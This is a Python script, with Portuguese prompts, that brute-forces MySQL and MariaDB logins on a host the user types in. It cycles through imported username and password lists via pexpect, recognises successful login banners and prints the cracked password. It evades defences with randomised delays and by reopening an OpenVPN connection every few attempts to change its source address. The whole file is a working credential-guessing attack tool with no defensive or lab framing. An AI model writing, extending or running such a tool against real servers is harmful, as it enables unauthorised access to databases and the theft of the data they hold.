import pexpect
import random
import passwords
import time
import vpn
import users
from pathlib import Path

passwordsl = passwords.passwords_
usersl = users.users_
openvpn_enter = vpn.openvpn_enter_()

finded = False

LOGIN_SUCCESS_MARIADB = 0
LOGIN_SUCCESS_MYSQL = 1
LOGIN_SUCCESS_MARIADB_PT = 2
LOGIN_SUCCESS_MYSQL_PT = 3
LOGIN_SUCCESS_PROMPT = 4
ERROR_1698 = 5
ERROR_1045 = 6
END = 7
TIMEOUT = 8


def update_status(line_number, value):
    status_file = Path("/tmp/status")
    with status_file.open("r", encoding="utf-8") as f:
        lines = f.readlines()
    while len(lines) < 5:
        lines.append("\n")
    lines[line_number] = f"{value}\n"
    temporary_file = status_file.with_suffix(".tmp")
    with temporary_file.open("w", encoding="utf-8") as f:
        f.writelines(lines)
    temporary_file.replace(status_file)


def expect_state(process, patterns):
    try:
        return process.expect(patterns)
    except pexpect.EOF:
        return END
    except pexpect.TIMEOUT:
        return TIMEOUT


i = int(input("Qual o valor inicial do usuário: "))
j = int(input("Qual o valor inicial da senha: "))

destino = input("Qual o destino: ")

next_ = random.randint(30, 45)
next5 = 5

tries_exceeded = 0

while i < len(usersl):

    update_status(1, i)

    while j < len(passwordsl):

        update_status(2, j)

        process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)

        result = expect_state(
            process,
            [r"(?i)(?:Enter password|Digite a senha):"],
        )

        if result == 0:
            try:
                process.sendline(str(passwordsl[j]))
            except pexpect.EOF:
                result = END
            except pexpect.TIMEOUT:
                result = TIMEOUT

        if result == 0:
            result = expect_state(process, [
                r"Welcome to the MariaDB monitor",
                r"Welcome to the MySQL monitor",
                r"Bem-vindo ao monitor do MariaDB",
                r"Bem-vindo ao monitor do MySQL",
                r"(?m)^(?:mysql|MariaDB(?:\s+\[[^\r\n]*\])?)>\s*",
                r"ERROR 1698",
                r"ERROR 1045",
                pexpect.EOF,
                pexpect.TIMEOUT,
            ])

        if result in (
            LOGIN_SUCCESS_MARIADB,
            LOGIN_SUCCESS_MYSQL,
            LOGIN_SUCCESS_MARIADB_PT,
            LOGIN_SUCCESS_MYSQL_PT,
            LOGIN_SUCCESS_PROMPT,
        ):
            password = passwordsl[j]
            print(password)
            process.close()

            finded = True

            update_status(3, "True")

            break

        if result in (ERROR_1698, ERROR_1045):
            print("Senha recusada pelo MySQL.")
        elif result == END:
            print("A conexão com o MySQL foi encerrada.")
        elif result == TIMEOUT:
            print("Tempo limite aguardando a resposta do MySQL.")

        if j == next_:
            time.sleep(random.randint(15, 20))
            next_ += random.randint(35, 55)

        delay = random.randint(1, 10)
        time.sleep(delay)

        if result in (END, TIMEOUT):
            tries_exceeded += 1

            if tries_exceeded >= 15:
                update_status(4, "Muitas tentativas falhadas. Arquivo encerrado")

                print("Muitas tentativas falhadas. Encerrando...")
                process.close()
                break

            process.close()
            continue

        tries_exceeded = 0
        process.close()
        
        if j >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()
            next5 += 5

        j += 1

    if tries_exceeded >= 15:
        break

    if finded == True:
        break

    i += 1
    j = 0

if not finded and tries_exceeded < 15:
    update_status(4, "Nenhuma combinação encontrada")

openvpn_enter.close()